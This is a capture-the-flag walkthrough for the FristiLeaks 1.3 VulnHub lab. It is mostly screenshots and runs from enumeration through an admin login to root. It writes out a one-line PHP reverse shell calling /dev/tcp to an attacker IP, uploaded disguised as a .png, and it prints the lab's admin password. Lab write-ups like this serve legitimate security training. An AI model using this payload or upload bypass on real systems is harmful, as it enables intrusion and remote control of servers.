# [FristiLeaks 1.3](https://www.vulnhub.com/entry/fristileaks-13,133/)

![fristileaks](img/fristileaks.png)

## Enum

- `nmap`:

![nmap](img/nmap.png)

- HTTP:

![fristi](img/fristi.png)

- `dirb`:

![dirb](img/dirb.png)

- **robots.txt**:

![robots.txt](img/dir.png)

These three directories display the same image:

![url](img/url.png)

The common point between **cola**, **beer** and **sisi** is that they are 3 drinks. If we go backward and take a look at the home page we see the following message: _Keep calm and drink **Fristi**_.

So we can try the following url: `http://192.168.43.17/fristi/` and bingo, ther is an admin portal:

![admin-portal](img/admin-portal.png)

## Admin portal

If we check the sources, we can see an interesting comment written by `eezeepz`:

![eezeepz](img/eezeepz.png)

And just below, a base64 encoded string: 

![base64-img](img/base64-img.png)

We can decode it via `$ cat b64 | base64 -d > image.png` in command line. Then we got an image:

![admin-password](img/admin-password.png)

So we try the credentials `eezeepz` as a login and `keKkeKKeKKeKkEkkEk` as a password:

![login-successful](img/login-successful.png)

## Reverse shell

![upload](img/upload.png)

Let's try to upload the image we decoded previously:

![upload-success](img/upload-success.png)

Yes, it works!

![upload-success 2](img/upload-success-2.png)

Let's try to upload a [PHP tiny reverse shell](https://gist.github.com/rshipp/eee36684db07d234c1cc) file with **.png** extension:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'");
```

The file was uploaded, so we can use `nc` to get a shell:

![reverse-shell-success](img/reverse-shell-success.png)

![reverse-shell-success](img/reverse-shell-success-2.png)

## Privesc


![home](img/home.png)

In the home directory of the user eezeepz:

![notes](img/notes.png)

Ok so if we put some commands in a file called `runthis` in `/tmp`, they will be executed. I decided to change the permissions to access to `/home/admin` _(maybe I should have made a simple copy in `/tmp` to be more discreet)_:

![home-admin](img/home-admin.png)

![cryptpass](img/cryptpass.png)

![rot13](img/rot13.png)

![adminpass](img/adminpass.png)

![su-admin](img/su-admin.png)

## Road to root

![second-password rot13](img/second-password-rot13.png)

![second-password](img/second-password.png)

![fristigodshell](img/fristigodshell.png)

![.secret_admin_stuff](img/secret_admin_stuff.png)

![doCom](img/doCom.png)

![sudo-l](img/sudo-l.png)

![doCom-ls](img/doCom-ls.png)

![not-allowed](img/not-allowed.png)

![strings](img/strings.png)

![user-fristi](img/user-fristi.png)

![flag](img/flag.png)